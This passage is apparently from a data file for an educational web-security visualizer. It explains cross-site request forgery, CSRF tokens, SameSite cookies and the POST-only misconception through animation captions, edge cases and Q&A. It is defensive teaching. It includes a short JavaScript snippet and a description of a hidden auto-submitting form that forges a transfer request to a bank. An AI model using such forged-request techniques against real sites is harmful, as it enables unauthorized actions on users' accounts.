          ],
          phases: [
            { id: 'p1', caption: 'CSRF never reads the cookie: the attacker only needs the send.', activeNodeIds: ['evil'] },
            { id: 'p2', caption: 'A form, a tracking image, or a no-cors fetch all send credentialed requests cross-site.', packets: [{ from: 'evil', to: 'victim', label: 'payload' }], activeNodeIds: ['victim', 'evil'] },
            { id: 'p3', caption: 'The browser inspects the destination — bank.com — and looks up matching cookies.', packets: [{ from: 'victim', to: 'cookies', label: 'cookie lookup' }], activeNodeIds: ['cookies'] },
            { id: 'p4', caption: 'It attaches the session cookie and forwards the forged request to the bank.', packets: [{ from: 'cookies', to: 'bank', label: 'session=...' }, { from: 'victim', to: 'bank', label: 'forged POST' }], doneNodeIds: ['evil'], activeNodeIds: ['bank'] },
            { id: 'p5', caption: 'The bank processes the side effect as the authenticated user.', doneNodeIds: ['cookies'], activeNodeIds: ['bank'] },
            { id: 'p6', caption: 'The same-origin policy blocks reading the response — irrelevant for a state change.', doneNodeIds: ['victim', 'evil', 'bank', 'cookies'] },
          ],
        },
      },
      {
        title: 'CSRF tokens prove intent',
        body: `If the browser attaches cookies automatically, the server needs a second signal that the request came from the application's own page and not from a forged one. The standard answer is a CSRF token: a random, per-session value embedded in forms or sent as a custom header, which the server compares on every state-changing request. The attacker cannot read the token because the same-origin policy prevents cross-origin reads, and cannot guess it because it is unpredictable. The animation shows both paths: the legitimate submit carries the cookie plus a matching token and is accepted; the forged submit carries the cookie but no valid token and is rejected. Implementation details matter — bind the token to the session, compare in constant time, and rotate it on login. A double-submit cookie is an acceptable stateless variant when SameSite is also enforced.`,
        animation: {
          kind: 'step-flow',
          nodes: [
            { id: 'victim', label: 'Victim Browser' },
            { id: 'evil', label: 'Evil Site' },
            { id: 'bank', label: 'Bank Server' },
            { id: 'cookies', label: 'Cookie Store', sublabel: 'bank.com session' },
          ],
          phases: [
            { id: 'p1', caption: 'The bank renders the transfer form with a random token bound to the session.', activeNodeIds: ['bank'] },
            { id: 'p2', caption: 'The token reaches the victim inside the page; evil.com cannot read it cross-origin.', packets: [{ from: 'bank', to: 'victim', label: 'form + csrf_token' }], activeNodeIds: ['victim'] },
            { id: 'p3', caption: 'A legitimate submit returns the cookie plus the matching token, and the server accepts.', packets: [{ from: 'victim', to: 'bank', label: 'POST + token' }], doneNodeIds: ['cookies'], activeNodeIds: ['bank'] },
            { id: 'p4', caption: 'The forged request from evil.com carries the cookie but has no valid token.', packets: [{ from: 'evil', to: 'victim', label: 'forged POST' }], activeNodeIds: ['evil', 'victim'] },
            { id: 'p5', caption: 'The server compares tokens, finds a mismatch, and changes nothing.', errorNodeIds: ['evil'], activeNodeIds: ['bank'] },
            { id: 'p6', caption: 'The cookie proves the session; the token proves the request came from the app page.', doneNodeIds: ['victim', 'evil', 'bank', 'cookies'] },
          ],
        },
      },
      {
        title: 'SameSite: the browser default',
        body: `SameSite gives the browser a veto before the cookie is ever attached. SameSite=Strict never sends the cookie on cross-site requests; SameSite=Lax allows it only on top-level GET navigations and withholds it from cross-site POSTs, iframes, and scripted requests; SameSite=None requires Secure and sends everywhere, which is the setting to audit carefully. Modern browsers default unset cookies to Lax, which quietly removed a large share of the CSRF surface. The animation sends the same forged POST twice: first the Lax cookie is withheld by the browser, then the request arrives at the bank with no session and fails closed. The caveat is the GET exception — a top-level link still carries a Lax cookie, so any GET endpoint that changes state remains exploitable. Never change state on GET.`,
        animation: {
          kind: 'step-flow',
          nodes: [
            { id: 'victim', label: 'Victim Browser' },
            { id: 'evil', label: 'Evil Site' },
            { id: 'bank', label: 'Bank Server' },
            { id: 'cookies', label: 'Cookie Store', sublabel: 'bank.com session' },
          ],
          phases: [
            { id: 'p1', caption: 'The session cookie is issued with SameSite=Lax — the modern browser default.', packets: [{ from: 'bank', to: 'cookies', label: 'Set-Cookie; Lax' }], activeNodeIds: ['bank', 'cookies'] },
            { id: 'p2', caption: 'Evil site fires a cross-site POST to bank.com while the victim is logged in.', packets: [{ from: 'evil', to: 'victim', label: 'cross-site POST' }], activeNodeIds: ['evil', 'victim'] },
            { id: 'p3', caption: 'The browser evaluates the cookie SameSite attribute before attaching it.', activeNodeIds: ['cookies'] },
            { id: 'p4', caption: 'Lax withholds the cookie from cross-site POSTs, iframes, and scripted requests.', packets: [{ from: 'victim', to: 'bank', label: 'POST, no cookie' }], doneNodeIds: ['evil'], activeNodeIds: ['bank'] },
            { id: 'p5', caption: 'The bank receives an anonymous request and fails closed.', doneNodeIds: ['victim', 'cookies'], activeNodeIds: ['bank'] },
            { id: 'p6', caption: 'A top-level GET would still carry the Lax cookie — keep GET free of side effects.', packets: [{ from: 'victim', to: 'bank', label: 'GET + cookie' }], doneNodeIds: ['victim', 'evil', 'bank', 'cookies'] },
          ],
        },
      },
      {
        title: 'POST-only is not enough',
        body: `Some engineers conclude that accepting only POST blocks CSRF because an attacker cannot forge a POST. They can: a hidden HTML form with method post, submitted automatically by script or by an onload handler, sends a simple cross-site request with no preflight, and cookies ride along. The misconception comes from confusing POST with non-simple CORS requests. Requiring Content-Type application/json or a custom header raises the bar because those trigger a preflight that a cross-site form cannot satisfy, but that is a side effect of CORS rather than of the method itself. Meanwhile GET endpoints with side effects are the worst case: links, images, and prefetchers all trigger them. The animation shows a form-based cross-site POST succeeding while a JSON request is stopped by preflight. Keep state changes on POST and still require tokens or SameSite.`,
        code: {
          language: 'javascript',
          source: `// a simple form POST needs no preflight — CSRF works
form.method = 'POST';
form.action = 'https://bank.com/transfer';

// a JSON fetch is non-simple: the browser preflights it,
// and without CORS approval the request never reaches the bank
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
});`,
        },
        animation: {
          kind: 'step-flow',
          nodes: [
            { id: 'victim', label: 'Victim Browser' },
            { id: 'evil', label: 'Evil Site' },
            { id: 'bank', label: 'Bank Server' },
            { id: 'cookies', label: 'Cookie Store', sublabel: 'bank.com session' },
          ],
          phases: [
            { id: 'p1', caption: 'Evil site renders a hidden form with method post targeting bank.com/transfer.', activeNodeIds: ['evil'] },
            { id: 'p2', caption: 'Simple cross-site form posts need no preflight, and cookies ride along automatically.', packets: [{ from: 'evil', to: 'victim', label: 'hidden form' }, { from: 'cookies', to: 'bank', label: 'session=...' }], activeNodeIds: ['victim', 'cookies'] },
            { id: 'p3', caption: 'The bank sees a valid session: POST-only did not block the forgery.', packets: [{ from: 'victim', to: 'bank', label: 'POST + cookie' }], doneNodeIds: ['evil'], activeNodeIds: ['bank'] },
            { id: 'p4', caption: 'Now the attacker tries a JSON fetch with Content-Type application/json.', packets: [{ from: 'evil', to: 'victim', label: 'JSON fetch' }], activeNodeIds: ['evil', 'victim'] },
            { id: 'p5', caption: 'Because the request is non-simple, the browser sends an OPTIONS preflight first.', packets: [{ from: 'victim', to: 'bank', label: 'OPTIONS preflight' }], doneNodeIds: ['cookies'], activeNodeIds: ['bank'] },
            { id: 'p6', caption: 'No CORS approval comes back, so the fetch is blocked — yet the form POST already succeeded.', errorNodeIds: ['evil'], doneNodeIds: ['victim', 'bank', 'cookies'] },
          ],
        },
      },
    ],
    edgeCases: [
      'Assuming POST-only is safe: HTML forms POST cross-site as simple requests without preflight — require a CSRF token or SameSite instead of trusting the method.',
      'Forgetting GET side effects: links, images, and prefetchers trigger top-level or subresource GETs that still carry Lax cookies — never change state on GET.',
      'Using SameSite=None without Secure: browsers reject insecure None cookies, and None sends them on every cross-site request — pair None with Secure and a CSRF token.',
      'Trusting the Origin header when it is absent: some clients omit it — fall back to Referer, validate against an allowlist, and fail closed for state-changing requests.',
      'Storing SPA tokens in localStorage to dodge CSRF: the vulnerability disappears but XSS theft takes over — pick the threat you can mitigate and layer defenses.',
    ],
    followUps: [
      {
        q: 'Why does the same-origin policy not stop CSRF?',
        a: 'The same-origin policy prevents one origin from reading another response; it does not prevent the browser from sending a request with cookies attached. CSRF only needs the send, not the read.',
      },
      {
        q: 'What does SameSite=Lax actually allow?',
        a: 'It withholds cookies from cross-site POSTs, iframes, and scripted requests, but sends them on top-level GET navigations. That exception is why GET endpoints must never have side effects.',
      },
      {
        q: 'Do CSRF tokens replace SameSite?',
        a: 'No, they complement each other. SameSite is browser-enforced but can be bypassed by older clients or subdomain deployments, while a verified token proves the request came from your page. Use both.',
      },
    ],
    relatedEngine: { label: 'Explore the Web Security visualizer', href: '/fullstack/websecurity' },
  },
];
